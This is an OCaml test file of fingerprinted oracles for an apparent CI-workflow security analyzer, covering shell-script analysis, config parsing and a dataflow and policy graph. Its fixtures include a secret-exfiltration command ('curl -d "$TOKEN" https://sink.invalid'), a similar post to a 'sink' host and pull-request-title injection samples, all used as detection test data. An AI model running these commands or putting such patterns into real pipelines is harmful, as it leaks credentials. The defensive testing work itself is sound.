exception Oracle_failed of string

let failures = ref []

let record_failure format =
  Printf.ksprintf (fun message -> failures := message :: !failures) format

let fingerprint name expected value =
  let actual = Json.to_string value |> Sha256.digest_string in
  Printf.printf "mutation oracle %s: %s\n%!" name actual;
  if actual <> expected then
    record_failure "%s fingerprint changed: expected %s, found %s" name expected
      actual

let strings values =
  Json.Array (List.map (fun value -> Json.String value) values)

let script_summary_json (summary : Script_adapter.summary) =
  Json.Object
    [
      ("shell", Json.String (Script_adapter.shell_name summary.shell));
      ( "tokens",
        Json.Array
          (List.map
             (fun (token : Script_adapter.token) ->
               Json.Object
                 [
                   ("quoted", Json.Bool token.quoted);
                   ("start", Json.Int token.start);
                   ("stop", Json.Int token.stop);
                   ("text", Json.String token.text);
                 ])
             summary.tokens) );
      ( "capabilities",
        strings (List.map Ir.capability_name summary.capabilities) );
      ("effects", strings (List.map Ir.effect_name summary.effects));
      ("unknowns", Json.Array (List.map Unknown.to_json summary.unknowns));
      ( "expansions",
        Json.Array
          (List.map
             (fun (expansion : Script_adapter.expansion) ->
               Json.Object
                 [
                   ("quoted", Json.Bool expansion.expansion_quoted);
                   ("start", Json.Int expansion.expansion_start);
                   ("stop", Json.Int expansion.expansion_stop);
                   ("text", Json.String expansion.expansion_text);
                 ])
             summary.expansions) );
      ("unsafe_interpolation", Json.Bool summary.unsafe_interpolation);
      ("secret_to_network", Json.Bool summary.secret_to_network);
      ("secret_to_output", Json.Bool summary.secret_to_output);
    ]

let script_oracle () =
  let cases =
    [
      (Script_adapter.Posix, "printf '%s' \"$TITLE\"");
      (Posix, "echo $TITLE | tee output.txt");
      (Posix, "cat < private.txt > public.txt");
      (Posix, "curl -H \"Authorization: Bearer $TOKEN\" https://api.example");
      (Posix, "wget -O artifact.tgz https://example.invalid/a");
      (Posix, "git config credential.helper store");
      (Posix, "git push origin HEAD:main");
      (Posix, "gh release create v1 dist/app");
      (Posix, "docker login registry.example --password-stdin");
      (Posix, "kubectl apply -f deployment.yml");
      (Posix, "terraform apply -auto-approve");
      (Posix, "aws cloudformation deploy --stack-name app");
      (Posix, "cp artifact /tmp/cache && chmod 600 /tmp/cache");
      (Bash, "STAMP=$(date); printf '%s' ${TITLE}");
      (Bash, "echo '${{ secrets.TOKEN }}'");
      (Bash, "echo ${{ github.event.pull_request.title }}");
      (Bash, "printf '%s' \"$NPM_TOKEN\" > private.txt");
      (Bash, "printf '%s' \"$NPM_TOKEN\" > $DESTINATION");
      (Bash, "echo \"$PASSWORD\" | docker login --password-stdin host");
      (Bash, "false || curl https://fallback.invalid");
      (Bash, "true && rm -f scratch.tmp");
      (Bash, "python - <<'PY'\nprint('safe')\nPY");
      (PowerShell, "Write-Output $env:TITLE");
      (PowerShell, "Write-Output \"$env:TOKEN\" | Tee-Object log.txt");
      (PowerShell, "Invoke-WebRequest -Uri https://example.invalid");
      (PowerShell, "Set-Content -Path out.txt -Value $env:SECRET");
      (PowerShell, "gh api repos/o/r/releases");
      (Cmd, "echo %TITLE%");
      (Cmd, "echo !TOKEN! > output.txt");
      (Cmd, "curl.exe https://example.invalid && git push");
      (Cmd, "set TOKEN=secret & echo %TOKEN%");
      (Python, "print(os.environ['TOKEN'])");
      (Python, "requests.post(url, data=os.environ.get('TOKEN'))");
      (Python, "subprocess.run(['git', 'push'])");
      (Python, "open('artifact.bin', 'wb').write(data)");
      (Unknown_shell "fish", "curl https://example.invalid | read token");
      (Unknown_shell "nushell", "open secret.txt | http post https://sink");
    ]
  in
  Json.Array
    (List.map
       (fun (shell, source) ->
         Json.Object
           [
             ("source", Json.String source);
             ( "summary",
               script_summary_json (Script_adapter.analyze shell source) );
           ])
       cases)
  |> fingerprint "script-adapter"
       "6730432f3d2f13af4cef4d627a4c5e2788e21739f2abe696a5cb9030ae831594"

let config_result_json source =
  match Config.parse source with
  | Ok config -> Json.Object [ ("ok", Config.to_json config) ]
  | Error errors -> Json.Object [ ("errors", strings errors) ]

let full_config =
  "version = 1\n" ^ "persona = \"paranoid\" # strict gate\n"
  ^ "frontends = [\"github\", \"gitlab\", \"azure\", \"circleci\"]\n"
  ^ "offline = true\n" ^ "[resolver]\nrequire_immutable = true\n"
  ^ "allowed_sources = [\"github.com\", \"gitlab.com\"]\n"
  ^ "[sandbox]\nbackend = \"linux-native\"\n" ^ "image = \"sha256:"
  ^ String.make 64 'a' ^ "\"\n"
  ^ "network = \"deny\"\ncpu_seconds = 7\nmemory_mb = 64\n"
  ^ "processes = 8\noutput_bytes = 4096\n"
  ^ "[[allowlist]]\nkind = \"dependency\"\nvalue = \"owner/action\"\n"
  ^ "reason = \"reviewed # literal\"\n"
  ^ "[[allowlist]]\nkind = \"network_host\"\nvalue = \"example.com\"\n"
  ^ "reason = \"required API\"\n"
  ^ "[[rules]]\nid = \"ORG-ALL\"\nkind = \"forbid\"\n"
  ^ "selector.mode = \"all\"\nselector.provider = \"github\"\n"
  ^ "selector.trust = \"untrusted\"\nselector.effect = \"network\"\n"
  ^ "message = \"untrusted network\"\nseverity = \"critical\"\n"
  ^ "[[rules]]\nid = \"ORG-ANY\"\nkind = \"limit\"\nlimit = 2\n"
  ^ "selector.mode = \"any\"\nselector.capability = \"repository_write\"\n"
  ^ "selector.kind = \"command\"\nseverity = \"warning\"\n"
  ^ "[[rules]]\nid = \"ORG-NONE\"\nkind = \"require\"\n"
  ^ "selector.mode = \"none\"\nselector.mutability = \"mutable\"\n"
  ^ "severity = \"note\"\n"
  ^ "[[rules]]\nid = \"ORG-PATH\"\nkind = \"forbid_path\"\n"
  ^ "selector.path = \".github/\"\nselector.dominance = \"false\"\n"
  ^ "[[suppressions]]\nrule = \"WV-SEC-001\"\n"
  ^ "path = \".github/workflows/ci.yml\"\nreason = \"reviewed fixture\"\n"
  ^ "[[suppressions]]\nrule = \"WV-NOTE\"\nreason = \"global review\"\n"

let config_oracle () =
  let invalid =
    [
      "version = 2\n";
      "version = one\n";
      "offline = false\n";
      "offline = maybe\n";
      "persona = \"unknown\"\n";
      "frontends = [\"github\", \"github\"]\n";
      "frontends = [\"other\"]\n";
      "eval = \"danger()\"\n";
      "unknown = true\n";
      "[unknown]\nvalue = 1\n";
      "[resolver]\nrequire_immutable = false\n";
      "[resolver]\nallowed_sources = broken\n";
      "[resolver]\nunknown = true\n";
      "[resolver]\n\
       require_immutable = true\n\
       [resolver]\n\
       require_immutable = true\n";
      "[sandbox]\nbackend = \"unknown\"\n";
      "[sandbox]\nbackend = \"oci:\"\n";
      "[sandbox]\nimage = \"mutable\"\n";
      "[sandbox]\nnetwork = \"allow\"\n";
      "[sandbox]\ncpu_seconds = 0\n";
      "[sandbox]\nprocesses = nope\n";
      "[[rules]]\nid = \"X\"\nkind = \"unknown\"\n";
      "[[rules]]\nid = \"X\"\nkind = \"limit\"\nlimit = nope\n";
      "[[rules]]\nid = \"X\"\nkind = \"forbid\"\nseverity = \"fatal\"\n";
      "[[rules]]\nid = \"X\"\nkind = \"forbid\"\nselector.mode = \"xor\"\n";
      "[[rules]]\n\
       id = \"X\"\n\
       kind = \"forbid\"\n\
       selector.effect = \"teleport\"\n";
      "[[suppressions]]\nrule = \"X\"\nreason = \"\"\n";
      "[[suppressions]]\nrule = \"X\"\nreason = \"ok\"\nextra = \"bad\"\n";
      "[[allowlist]]\nkind = \"other\"\nvalue = \"x\"\nreason = \"r\"\n";
      "[[allowlist]]\nkind = \"source\"\nvalue = \"\"\nreason = \"r\"\n";
      "this is not an assignment\n";
    ]
  in
  let suppression_evidence =
    match Config.parse full_config with
    | Error _ -> Json.Bool false
    | Ok config ->
        let diagnostic file rule =
          Diagnostic.make ~rule_id:rule ~severity:Diagnostic.Warning
            ~confidence:Diagnostic.Medium ~message:"fixture"
            ~span:
              (Span.make ~file (Span.position ~byte:0 ())
                 (Span.position ~byte:1 ()))
            ()
        in
        Json.Array
          [
            Json.Bool
              (Config.suppressed config
                 (diagnostic ".github/workflows/ci.yml" "WV-SEC-001"));
            Json.Bool
              (Config.suppressed config
                 (diagnostic ".github/workflows/other.yml" "WV-SEC-001"));
            Json.Bool
              (Config.suppressed config (diagnostic "any.yml" "WV-NOTE"));
          ]
  in
  Json.Object
    [
      ("default", Config.to_json Config.default);
      ("full", config_result_json full_config);
      ("invalid", Json.Array (List.map config_result_json invalid));
      ("suppressed", suppression_evidence);
    ]
  |> fingerprint "config"
       "4856d1b02ac8e29e9d01890c5d97d3f4c3716c525c27648a08b62907b0aec728"

let position index =
  Span.position ~byte:(index * 3) ~line:(index + 1) ~column:2 ()

let span index file = Span.make ~file (position index) (position (index + 1))

let value ?(trust = Abstract_value.Trusted) ?(secrecy = Abstract_value.Public)
    index text =
  Abstract_value.string_constant text ~trust ~secrecy
    ~provenance:
      [
        {
          Abstract_value.origin = "oracle";
          operation = "fixture";
          span = span index "oracle.yml";
        };
      ]

let node ?(provider = Ir.Github) ?(kind = Ir.Command) ?(phase = Ir.Run)
    ?(condition = Condition.true_) ?(attributes = []) ?(capabilities = [])
    ?(effects = []) ?unknown index name =
  Ir.make_node ~provider ~kind ~name ~phase ~span:(span index "oracle.yml")
    ~condition ~attributes ~capabilities ~effects ?unknown ()

let edge ?(kind = Ir.Control) ?(condition = Condition.true_) ?label
    (source : Ir.node) (target : Ir.node) =
  Ir.make_edge ~kind ~from_:source.Ir.id ~to_:target.Ir.id ~condition ?label ()

let graph ?(provider = Ir.Github) ?(source = "oracle.yml") nodes edges entries =
  List.fold_left
    (fun state item -> Ir.add_node item state)
    (Ir.empty provider source) nodes
  |> fun state ->
  List.fold_left (fun state item -> Ir.add_edge item state) state edges
  |> fun state ->
  List.fold_left
    (fun state (entry : Ir.node) -> Ir.add_entrypoint entry.id state)
    state entries
  |> Ir.finalize

let all_capabilities =
  [
    Ir.Repository_read;
    Repository_write;
    Token_read;
    Token_write;
    Oidc;
    Cloud_credential;
    Secret_access;
    Network;
    Filesystem_read;
    Filesystem_write;
    Shell;
    Artifact_read;
    Artifact_write;
    Cache_read;
    Cache_write;
    Deployment;
    Self_hosted_persistence;
    Ai_tool;
  ]

let all_effects =
  [
    Ir.Repository_change;
    Network_request;
    File_read;
    File_write;
    Command_execution;
    Artifact_publish;
    Cache_publish;
    Deployment_change;
    Credential_use;
    Workflow_change;
    Ai_agent_execution;
  ]

let semantic_graph () =
  let entry =
    node ~kind:Ir.Workflow ~phase:Ir.Compile
      ~capabilities:[ Ir.Repository_write; Token_write; Oidc ]
      0 "workflow"
  and untrusted =
    node ~kind:Ir.Resource
      ~attributes:
        [ ("value", value ~trust:Abstract_value.Untrusted 1 "pull request") ]
      1 "event:pull_request"
  and secret =
    node ~kind:Ir.Resource
      ~attributes:[ ("value", value ~secrecy:Abstract_value.Secret 2 "TOKEN") ]
      2 "secret:TOKEN"
  and gate =
    node ~kind:Ir.Gate ~phase:Ir.Plan
      ~condition:(Condition.atom "github.ref_protected")
      ~attributes:[ ("mechanism", value 3 "approval") ]
      3 "environment approval"
  and unsafe =
    node
      ~attributes:
        [
          ( "command",
            value ~trust:Abstract_value.Untrusted 4
              "echo ${{ github.event.pull_request.title }}" );
        ]
      ~capabilities:[ Ir.Shell ] 4 "echo $TITLE"
  and exfil =
    node
      ~attributes:
        [
          ( "command",
            value ~secrecy:Abstract_value.Secret 5
              "curl -d \"$TOKEN\" https://sink.invalid" );
        ]
      ~capabilities:[ Ir.Shell; Network; Secret_access ]
      5 "curl secret"
  and artifact =
    node ~kind:Ir.Resource
      ~capabilities:[ Ir.Artifact_read; Artifact_write ]
      6 "artifact:bundle"
  and cache =
    node ~kind:Ir.Resource
      ~capabilities:[ Ir.Cache_read; Cache_write ]
      7 "cache:dependencies"
  and checkout =
    node ~kind:Ir.Call
      ~attributes:
        [
          ("ref", value ~trust:Abstract_value.Untrusted 8 "feature");
          ("persist-credentials", value 8 "true");
        ]
      ~capabilities:[ Ir.Network; Self_hosted_persistence ]
      8 "actions/checkout@v4"
  and credential =
    node ~kind:Ir.Call
      ~attributes:
        [ ("credential", value ~secrecy:Abstract_value.Secret 9 "TOKEN") ]
      ~capabilities:[ Ir.Secret_access; Self_hosted_persistence ]
      9 "credential helper"
  and agent =
    node ~kind:Ir.Call
      ~attributes:
        [ ("prompt", value ~trust:Abstract_value.Untrusted 10 "issue body") ]
      ~capabilities:[ Ir.Network; Ai_tool ] ~effects:[ Ir.Ai_agent_execution ]
      10 "openai agent-action"
  and deploy =
    node ~capabilities:[ Ir.Shell; Deployment ]
      ~effects:[ Ir.Deployment_change ] 11 "kubectl apply -f deployment.yml"
  and self_modify =
    node
      ~capabilities:[ Ir.Shell; Filesystem_write ]
      12 "git add .github/workflows/ci.yml && git push"
  and immutable = node ~kind:Ir.Call 13 ("owner/action@" ^ String.make 40 'a')
  and digest_call =
    node ~kind:Ir.Call
      ~attributes:
        [ ("dependency.digest", value 14 ("sha256:" ^ String.make 64 'b')) ]
      14 "registry/action@stable"
  and unknown =
    node ~kind:Ir.Opaque
      ~unknown:(Unknown.Unsupported_syntax "dynamic provider expression") 15
      "dynamic"
  in
  graph
    [
      entry;
      untrusted;
      secret;
      gate;
      unsafe;
      exfil;
      artifact;
      cache;
      checkout;
      credential;
      agent;
      deploy;
      self_modify;
      immutable;
      digest_call;
      unknown;
    ]
    [
      edge entry gate;
      edge gate deploy;
      edge entry unsafe;
      edge entry exfil;
      edge entry self_modify;
      edge ~kind:Ir.Data untrusted unsafe;
      edge ~kind:Ir.Data secret exfil;
      edge ~kind:Ir.Write untrusted artifact;
      edge ~kind:Ir.Persist artifact deploy;
      edge ~kind:Ir.Write untrusted cache;
      edge ~kind:Ir.Read cache deploy;
      edge ~kind:Ir.Data untrusted checkout;
      edge ~kind:Ir.Call_edge checkout deploy;
      edge ~kind:Ir.Data secret credential;
      edge ~kind:Ir.Persist credential self_modify;
      edge ~kind:Ir.Data untrusted agent;
      edge ~kind:Ir.Call_edge agent self_modify;
      edge entry immutable;
      edge entry digest_call;
    ]
    [ entry ]

let bypass_graph () =
  let entry = node ~kind:Ir.Workflow ~phase:Ir.Compile 30 "bypass workflow"
  and gate = node ~kind:Ir.Gate ~phase:Ir.Plan 31 "environment approval"
  and deploy =
    node ~kind:Ir.Effect
      ~effects:[ Ir.Repository_change; Deployment_change ]
      ~capabilities:[ Ir.Repository_write; Deployment ]
      32 "release"
  in
  graph [ entry; gate; deploy ]
    [ edge entry gate; edge gate deploy; edge entry deploy ]
    [ entry ]

let cyclic_graph () =
  let first = node ~kind:Ir.Call 40 "first"
  and second = node ~kind:Ir.Call 41 "second"
  and third = node ~kind:Ir.Step 42 "third" in
  graph [ first; second; third ]
    [
      edge ~kind:Ir.Call_edge first second;
      edge ~kind:Ir.Call_edge second first;
      edge first third;
      edge third first;
    ]
    [ first ]

let path_json = function
  | None -> Json.Null
  | Some nodes -> strings (List.map (fun (item : Ir.node) -> item.name) nodes)

let demand_json ((owner, capability), demand) =
  Json.Object
    [
      ("owner", Json.String owner.Ir.name);
      ("capability", Json.String (Ir.capability_name capability));
      ( "demand",
        match demand with
        | Capability_analysis.Required -> Json.String "required"
        | Excessive -> Json.String "excessive"
        | Unknown reasons -> Json.Array (List.map Unknown.to_json reasons) );
    ]

let policy_assignment_json index (key, value) =
  match Policy.predicate_of_assignment key value with
  | Error message ->
      Json.Object
        [
          ("key", Json.String key);
          ("value", Json.String value);
          ("error", Json.String message);
        ]
  | Ok predicate ->
      Policy.rule_to_json
        {
          Policy.id = Printf.sprintf "P-%03d" index;
          kind = Forbid;
          selector = All [ predicate ];
          message = key ^ "=" ^ value;
          severity = Diagnostic.Warning;
        }

let semantic_oracle () =
  let graph = semantic_graph ()
  and bypass = bypass_graph ()
  and cyclic = cyclic_graph () in
  let assignments =
    [
      ("provider", "github");
      ("provider", "gitlab");
      ("provider", "azure");
      ("provider", "circleci");
      ("kind", "trigger");
      ("kind", "parameter");
      ("kind", "workflow");
      ("kind", "stage");
      ("kind", "job");
      ("kind", "step");
      ("kind", "call");
      ("kind", "command");
      ("kind", "gate");
      ("kind", "resource");
      ("kind", "effect");
      ("kind", "opaque");
      ("path", ".github/");
      ("trust", "trusted");
      ("trust", "untrusted");
      ("trust", "mixed");
      ("trust", "unknown");
      ("effect", "repository_change");
      ("effect", "network_request");
      ("effect", "file_read");
      ("effect", "file_write");
      ("effect", "command_execution");
      ("effect", "artifact_publish");
      ("effect", "cache_publish");
      ("effect", "deployment_change");
      ("effect", "credential_use");
      ("effect", "workflow_change");
      ("effect", "ai_agent_execution");
    ]
    @ List.map
        (fun value -> ("capability", Ir.capability_name value))
        all_capabilities
    @ [
        ("mutability", "immutable");
        ("mutability", "mutable");
        ("mutability", "local");
        ("mutability", "unknown");
        ("dominance", "true");
        ("dominance", "false");
        ("provider", "invalid");
        ("kind", "invalid");
        ("trust", "invalid");
        ("effect", "invalid");
        ("capability", "invalid");
        ("mutability", "invalid");
        ("dominance", "invalid");
        ("unknown", "value");
      ]
  in
  let policy_rules =
    [
      {
        Policy.id = "ORACLE-FORBID";
        kind = Forbid;
        selector = Any [ Capability Ir.Network; Effect Ir.Workflow_change ];
        message = "network or workflow change";
        severity = Diagnostic.Critical;
      };
      {
        Policy.id = "ORACLE-REQUIRE";
        kind = Require;
        selector = All [ Provider Ir.Gitlab; Node_kind Ir.Trigger ];
        message = "gitlab trigger required";
        severity = Diagnostic.Error;
      };
      {
        Policy.id = "ORACLE-LIMIT";
        kind = Limit 2;
        selector = None_of [ Trust Policy.Trusted ];
        message = "untrusted surface limited";
        severity = Diagnostic.Warning;
      };
      {
        Policy.id = "ORACLE-PATH";
        kind = Forbid_path;
        selector = All [ Effect Ir.Deployment_change; Dominated_by_gate true ];
        message = "tainted deployment path";
        severity = Diagnostic.Note;
      };
    ]
  in
  let solution = Dataflow.solve graph in
  let first = List.hd graph.Ir.nodes
  and last = List.hd (List.rev graph.nodes) in
  let graph_facts =
    Json.Object
      [
        ("graph", Ir.to_json graph);
        ("bypass", Ir.to_json bypass);
        ("cyclic", Ir.to_json cyclic);
        ("dataflow_complete", Json.Bool solution.complete);
        ( "dataflow",
          Json.Array
            (List.map
               (fun (item : Ir.node) ->
                 Json.Object
                   [
                     ("node", Json.String item.name);
                     ( "value",
                       Abstract_value.to_json
                         (Dataflow.value_at solution item.id) );
                   ])
               graph.nodes) );
        ( "shortest",
          path_json (Graph_algorithms.shortest_path graph first.id last.id) );
        ( "shortest_without_gate",
          path_json
            (Graph_algorithms.shortest_path ~avoid:[ first.id ] graph first.id
               last.id) );
        ( "control_cycles",
          Json.Array (List.map strings (Graph_algorithms.control_cycles cyclic))
        );
        ( "call_cycles",
          Json.Array
            (List.map strings
               (Graph_algorithms.cycles ~edge_kinds:[ Ir.Call_edge ] cyclic)) );
        ( "dominance",
          Json.Array
            [
              Json.Bool
                (Graph_algorithms.dominates bypass
                   ~dominator:(List.nth bypass.nodes 0).id
                   ~node:(List.nth bypass.nodes 2).id);
              Json.Bool
                (Graph_algorithms.dominates bypass
                   ~dominator:(List.nth bypass.nodes 1).id
                   ~node:(List.nth bypass.nodes 2).id);
            ] );
        ( "grant_demands",
          Json.Array
            (List.map demand_json (Capability_analysis.grant_demands graph)) );
        ( "minimal_capabilities",
          strings
            (Graph_algorithms.shortest_path graph first.id last.id
            |> Option.value ~default:[] |> Capability_analysis.minimal_for_path
            |> List.map Ir.capability_name) );
      ]
  in
  let verifier =
    Json.Array
      (List.concat_map
         (fun candidate ->
           List.map
             (fun persona ->
               let result = Verifier.verify ~persona candidate in
               Json.Object
                 [
                   ("persona", Json.String (Verifier.persona_name persona));
                   ("result", Verifier.to_json result);
                   ( "should_fail",
                     Json.Bool (Verifier.should_fail persona result) );
                 ])
             [ Verifier.Gate; Audit; Paranoid ])
         [ graph; bypass; cyclic; Ir.empty Ir.Github "empty.yml" ])
  in
  let policy =
    Json.Object
      [
        ( "assignments",
          Json.Array (List.mapi policy_assignment_json assignments) );
        ("rules", Json.Array (List.map Policy.rule_to_json policy_rules));
        ( "diagnostics",
          Json.Array
            (List.map Diagnostic.to_json (Policy.evaluate policy_rules graph))
        );
      ]
  in
  let program = Program_graph.compose [ graph; bypass ] |> Ir.to_json in
  Json.Object
    [
      ( "enum_capabilities",
        strings (List.map Ir.capability_name all_capabilities) );
      ("enum_effects", strings (List.map Ir.effect_name all_effects));
      ("graph_facts", graph_facts);
      ("policy", policy);
      ("program", program);
      ("verifier", verifier);
    ]
  |> fingerprint "semantic-core"
       "8c013588d3dc61c0f9169463aa6c6bcbd45a207f11f8771958610a583606bff8"

let () =
  Printexc.record_backtrace true;
  (try script_oracle ()
   with error ->
     record_failure "script oracle raised: %s" (Printexc.to_string error));
  (try config_oracle ()
   with error ->
     record_failure "config oracle raised: %s" (Printexc.to_string error));
  (try semantic_oracle ()
   with error ->
     record_failure "semantic oracle raised: %s" (Printexc.to_string error));
  match List.rev !failures with
  | [] -> Printf.printf "mutation semantic oracles passed\n%!"
  | messages ->
      List.iter
        (fun message -> Printf.eprintf "not ok - %s\n%!" message)
        messages;
      exit 1
